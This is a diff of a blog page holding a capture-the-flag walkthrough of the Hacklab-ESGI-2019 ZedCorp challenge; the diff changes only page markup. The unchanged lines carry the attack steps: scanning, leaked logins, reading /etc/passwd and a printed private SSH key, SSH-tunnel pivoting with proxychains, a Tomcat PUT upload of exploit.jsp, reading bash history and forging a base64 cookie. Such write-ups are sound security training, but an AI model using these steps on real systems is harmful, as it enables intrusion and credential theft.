@@ -14,7 +14,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.72.0" />
+<meta name="generator" content="Hugo 0.90.1" />
 
   <meta property="og:title" content="[CTF - Hacklab-ESGI-2019] ZedCorp Challenge - My name is Rookie" />
 <meta property="og:description" content="" />
@@ -59,10 +59,11 @@
   <script src="https://thibaud-robin.fr/js/lightbox.min.js"></script>
   <script src="https://thibaud-robin.fr/js/termynal.js"></script>
   <script src="https://thibaud-robin.fr/js/emojify.min.js"></script>
-  
+
   <link rel="stylesheet" type="text/css" href="https://thibaud-robin.fr/css/termynal.css">
   <link rel="stylesheet" type="text/css" href="https://thibaud-robin.fr/css/hover.css">
   <link rel="stylesheet" type="text/css" href="https://thibaud-robin.fr/css/emojify.min.css">
+  <link rel="stylesheet" type="text/css" href="https://thibaud-robin.fr/css/darkreader.css">
 
 
 <script async src="https://www.googletagmanager.com/gtag/js?id=UA-133286401-1"></script>
@@ -228,10 +229,10 @@
 <p><em><strong>Nb : For the following Write-up we’ll use the local address 192.168.122.22 , you can consider that it’s ctf.hacklab-esgi.org.</strong></em></p>
 <p>The only information we have is a subdomain name : <code>ctf.hacklab-esgi.org</code></p>
 <p>We already have the following information :</p>
-<pre><code>http = ctf.hacklab-esgi.org:5008 
+<pre tabindex="0"><code>http = ctf.hacklab-esgi.org:5008 
 ssh = ctf.hacklab-esgi.org:5007
 </code></pre><p>First thing to do is to collect some informations about the target. Let&rsquo;s launch a port scan.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc<span style="color:#f92672">]</span>$ sudo nmap -v -A -O -sT 192.168.122.22
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc<span style="color:#f92672">]</span>$ sudo nmap -v -A -O -sT 192.168.122.22
 
 Starting Nmap 7.70 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-03-21 16:22 CET
 
@@ -260,7 +261,7 @@ PORT   STATE SERVICE VERSION
 </li>
 </ul>
 <p>Nmap return <code>http-title: 403 Forbidden</code> which could indicate that the web server is under WAF or something else who block request from nmap useragent. Let&rsquo;s check.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc<span style="color:#f92672">]</span>$ wafw00f 192.168.122.22 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc<span style="color:#f92672">]</span>$ wafw00f 192.168.122.22 
 
                                  ^     ^
         _   __  _   ____ _   __  _    _   ____
@@ -281,7 +282,7 @@ Number of requests: <span style="color:#ae81ff">11</span>
 <p>The website is ostensibly a simple one page statice website under construction</p>
 <p><img src="/img/hacklab-esgi-2019/1.png" alt="website"></p>
 <p>First thing to do is to launch an application scan to do a first analyse.</p>
-<pre><code>[th1b4ud@th1b4ud-pc]$ nikto -h 192.168.122.22
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc]$ nikto -h 192.168.122.22
 
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
@@ -322,7 +323,7 @@ Number of requests: <span style="color:#ae81ff">11</span>
 <p>The particularity of this access log is it write the full HTTP request submitted to the webserver (and not only the url like classic access log). So we can have some informations like request data or cookie.</p>
 <p>At the start of the file we see a HTTP POST request on <code>/login.php</code> file with credentials <code>test:test</code> but they don&rsquo;t work on the login page. Let&rsquo;s search deeper.</p>
 <p>Here is all credentials submitted to <code>/login.php</code> in this log page</p>
-<pre><code>username=test&amp;password=test
+<pre tabindex="0"><code>username=test&amp;password=test
 username=admin&amp;password=admin
 username=admin&amp;password=pxrAW7a4HNMBw86bc
 </code></pre><p>The last couple of credentials is correct and permit to access to the admin panel.</p>
@@ -348,7 +349,7 @@ username=admin&amp;password=pxrAW7a4HNMBw86bc
 <p>2 users are available in the <code>/etc/passwd</code> file. This is time to search on the server some informations.</p>
 <p><img src="/img/hacklab-esgi-2019/16.png" alt=""></p>
 <p>We can grab some network informations in <code>/etc/hosts</code> file</p>
-<pre><code>www-data@dev-server:/var/www/html/0cc175b9c0f1b6a831c399e269772661$ cat /etc/hosts
+<pre tabindex="0"><code>www-data@dev-server:/var/www/html/0cc175b9c0f1b6a831c399e269772661$ cat /etc/hosts
 
 127.0.0.1	localhost
 127.0.1.1	dev-server
@@ -362,7 +363,7 @@ username=admin&amp;password=pxrAW7a4HNMBw86bc
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
 </code></pre><p>And file <code>/etc/network/interfaces</code></p>
-<pre><code>www-data@dev-server:/var/www/html/0cc175b9c0f1b6a831c399e269772661$ cat /etc/network/interfaces
+<pre tabindex="0"><code>www-data@dev-server:/var/www/html/0cc175b9c0f1b6a831c399e269772661$ cat /etc/network/interfaces
               
 # This file describes the network interfaces available on your system
 # and how to activate them. For more information, see interfaces(5).
@@ -398,7 +399,7 @@ iface enp7s0 inet static
 </ul>
 <p>So we need to have a better access to the <code>dev-server</code> if we want to go deeper in the internal network.</p>
 <p>What is the user <code>test</code> seen in <code>/etc/passwd</code> ? Deactivate account. Weird. Let&rsquo;s check is own home (if we can).</p>
-<pre><code>www-data@dev-server:/home/test$ ls -al
+<pre tabindex="0"><code>www-data@dev-server:/home/test$ ls -al
 
 total 28
 drwxr-xr-x 3 test test 4096 Mar 10 23:16 .
@@ -410,7 +411,7 @@ drwxr-xr-x 4 test test 4096 Mar 18 15:20 ..
 drwxr-xr-x 2 test test 4096 Mar 10 23:16 .ssh
 </code></pre><p>Ho, <code>.ssh</code> folder. And look at this rights. The user may have done something like <code>chmod 755 *</code> because we can read the file <code>.bash_history</code>. Or maybe <code>chmod -R 755 *</code> ? What a bad practice&hellip;</p>
 <p>Let&rsquo;s check <code>.ssh</code> directory.</p>
-<pre><code>www-data@dev-server:/home/test/.ssh$ ls -al
+<pre tabindex="0"><code>www-data@dev-server:/home/test/.ssh$ ls -al
 
 total 20
 drwxr-xr-x 2 test test 4096 Mar 10 23:16 .
@@ -419,7 +420,7 @@ drwxr-xr-x 3 test test 4096 Mar 10 23:16 ..
 -rwxr-xr-x 1 test test 1679 Mar 10 23:09 id_rsa
 -rwxr-xr-x 1 test test  401 Mar 10 23:09 id_rsa.pub
 </code></pre><p>Hahaha ! That what I said ! We can read his private ssh key !</p>
-<pre><code>www-data@dev-server:/home/test/.ssh$ cat id_rsa
+<pre tabindex="0"><code>www-data@dev-server:/home/test/.ssh$ cat id_rsa
 
 -----BEGIN RSA PRIVATE KEY-----
 MIIEpAIBAAKCAQEA1f3hWbx2726sOiwm+gg8Td2261E7QSJhQHcQFEns7Ubonx6E
@@ -454,13 +455,13 @@ zc9Ur+20TJHIwAKloaZLiMdcpdyFUQQRStXCGD6wqbw8UxGfx1Fd0g==
 <p>As we saw in <code>/etc/passwd</code> the user <code>test</code> have <code>/usr/sbin/nologin</code> as shell. It means that user <code>test</code> can&rsquo;t have a shell on the server. But you can do a SSH tunnel without shell. With this technique you will be able to reach the internal network.</p>
 <p>You can use this command to do a dynamic SSH tunnel : <code>ssh -D 9050 test@192.168.122.22 -i id_rsa -N</code></p>
 <p>You can check that tunnel is correclty launched with netstat (or ss) command</p>
-<pre><code>[th1b4ud@th1b4ud-pc]$ sudo netstat -ntpl
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc]$ sudo netstat -ntpl
 tcp6       0      0 ::1:9050                :::*                    LISTEN      28403/ssh
 </code></pre><p>The hint <code>[HINT] : Do you know proxychains ?</code> on the login prompt guide you to use a specific tool</p>
 <p>Proxychains permit to run any program through proxy server. Our proxy server is our SSH tunnel. So proxychains permit us to redirect all our traffic trought the SSH tunnel. So if type this command <code>proxychains ping 10.0.0.2</code> this will send my ping throught the SSH tunnel and reach the internal server with ip <code>10.0.0.2</code></p>
 <p>In default proxychains will redirect all traffic to port 9050 (habitually used by TOR Proxy). So thats why I open the SSH tunnel on local port 9050.</p>
 <p>So you can now map the internal and confirm the informations collected in <code>/etc/hosts</code> file.</p>
-<pre><code>[th1b4ud@th1b4ud-pc]$ proxychains -q nmap project-server.zedcorp
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc]$ proxychains -q nmap project-server.zedcorp
 
 Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-23 15:42 CET
 Nmap scan report for 10.0.0.2
@@ -500,7 +501,7 @@ Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
 <p>The web server is a Nginx. It&rsquo;s protected by BasicAuth. We need to find credentials.</p>
 <p><img src="/img/hacklab-esgi-2019/19.png" alt=""></p>
 <p>The FTP server is a VSFTPd. It&rsquo;s also protected by login (anynmous login is not available). Need to find credentials too.</p>
-<pre><code>[th1b4ud@th1b4ud-pc]$ proxychains -q ftp 10.0.0.3
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc]$ proxychains -q ftp 10.0.0.3
 
 Connected to 10.0.0.3.
 220 (vsFTPd 3.0.3)
@@ -541,7 +542,7 @@ ftp&gt;
 it.</p>
 <p><img src="/img/hacklab-esgi-2019/24.png" alt=""></p>
 <p>HTTP payload</p>
-<pre><code>PUT /exploit.jsp/ HTTP/1.1
+<pre tabindex="0"><code>PUT /exploit.jsp/ HTTP/1.1
 Host: 192.168.122.201:8080
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36
@@ -578,7 +579,7 @@ Content-Length: 4
 <p><img src="/img/hacklab-esgi-2019/27.png" alt=""></p>
 <h2 id="step-8--bash-history-permission-mistake">Step 8 : Bash history permission mistake</h2>
 <p>Let&rsquo;s check some classic files</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tomcat@project-server:/home$ cat /etc/passwd
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tomcat@project-server:/home$ cat /etc/passwd
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -633,7 +634,7 @@ search zedcorp
 nameserver 10.0.0.1
 </code></pre></div><p>We have new users of ZedCorp company. Let&rsquo;s check their home.</p>
 <p>Let&rsquo;s check user home like the kanbans task said.</p>
-<pre><code>tomcat@project-server:/$ cd /home
+<pre tabindex="0"><code>tomcat@project-server:/$ cd /home
 cd /home
 
 tomcat@project-server:/home$ ls -al
@@ -690,7 +691,7 @@ drwxr-xr-x 6 root   root     4096 mars  18 15:37 ..
 -rw------- 1 trobin trobin    911 mars  20 10:52 .viminfo
 -rw-r--r-- 1 trobin trobin    200 mars  20 10:51 .wget-hsts
 </code></pre><p>OH ! Bash history of our lovely sysadmin is readable.</p>
-<pre><code>tomcat@project-server:/home$ cat /home/dcloutier/.bash_history
+<pre tabindex="0"><code>tomcat@project-server:/home$ cat /home/dcloutier/.bash_history
 cat /home/dcloutier/.bash_history
 ls
 ls -al
@@ -765,7 +766,7 @@ exit
 </ul>
 <p>Next step : admin-server pwn</p>
 <p>Don&rsquo;t forget to remove your backdoor (and nothing else bad h4x0r) :p</p>
-<pre><code>tomcat@project-server:/home$ cd /opt/tomcat/webapps/ROOT/
+<pre tabindex="0"><code>tomcat@project-server:/home$ cd /opt/tomcat/webapps/ROOT/
 tomcat@project-server:~/webapps/ROOT$ rm exploit.jsp
 rm exploit.jsp
 tomcat@project-server:~/webapps/ROOT$ ls -al
@@ -781,7 +782,7 @@ drwxr-xr-x 7 root   root    4096 mars  20 11:03 ..
 <p><img src="/img/hacklab-esgi-2019/29.png" alt=""></p>
 <p>You can download the file <code>credentials.tar.gz</code> with the command <code>get credentials.tar.gz</code></p>
 <p>Decrypt it</p>
-<pre><code>[th1b4ud@th1b4ud-pc]$ openssl enc -d -aes256 --pass pass:daniel2019 -in credentials.tar.gz | tar xz
+<pre tabindex="0"><code>[th1b4ud@th1b4ud-pc]$ openssl enc -d -aes256 --pass pass:daniel2019 -in credentials.tar.gz | tar xz
 
 [th1b4ud@th1b4ud-pc]$ cat credentials.txt
 
@@ -818,7 +819,7 @@ CREDENTIALS
 <p>Let&rsquo;s check requests captured by burp.</p>
 <p><img src="/img/hacklab-esgi-2019/35.png" alt=""></p>
 <p>There is some cookies. Look at this strange cookie <code>status</code>. He has the value <code>admin</code> encoded in base64. Do you think the application check user status with this status ? Let&rsquo;s check with <code>ceo</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;YWRtaW4=&#34;</span> | base64 -d
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;YWRtaW4=&#34;</span> | base64 -d
 admin
 <span style="color:#f92672">[</span>th1b4ud@th1b4ud-pc<span style="color:#f92672">]</span>$ echo -n <span style="color:#e6db74">&#34;ceo&#34;</span> | base64
 Y2Vv
@@ -851,7 +852,7 @@ Y2Vv
 		</ul>
 	</div>
 
-	<p>&copy; 2020. All rights reserved.</p>
+	<p>&copy; 2021. All rights reserved.</p>
 </div>
     </div>
   </div>
